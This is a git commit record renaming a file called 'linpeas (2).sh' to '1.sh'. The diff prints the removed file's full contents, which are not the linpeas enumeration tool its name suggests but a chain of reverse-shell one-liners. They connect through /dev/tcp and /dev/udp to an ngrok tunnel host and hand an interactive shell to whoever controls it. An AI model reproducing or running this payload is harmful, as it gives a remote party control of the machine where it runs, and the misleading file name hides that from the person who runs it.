66932c8a2f479a1a6f46dc8a42b156c573855d7d
Byshop <60990002+byshop04@users.noreply.github.com>
2022-07-20 19:47:40 -0300

    Rename linpeas (2).sh to 1.sh

--- linpeas (2).sh
+++
@@ -1,3 +0,0 @@
-#!/bin/sh
-
-sh -i >& /dev/tcp/0.tcp.sa.ngrok.io/14241 0>&1 | 0<&196;exec 196<>/dev/tcp/0.tcp.sa.ngrok.io/14241; sh <&196 >&196 2>&196 | exec 5<>/dev/tcp/0.tcp.sa.ngrok.io/14241;cat <&5 | while read line; do $line 2>&5 >&5; done | sh -i 5<> /dev/tcp/0.tcp.sa.ngrok.io/14241 0<&5 1>&5 2>&5 | sh -i >& /dev/udp/0.tcp.sa.ngrok.io/14241 0>&1
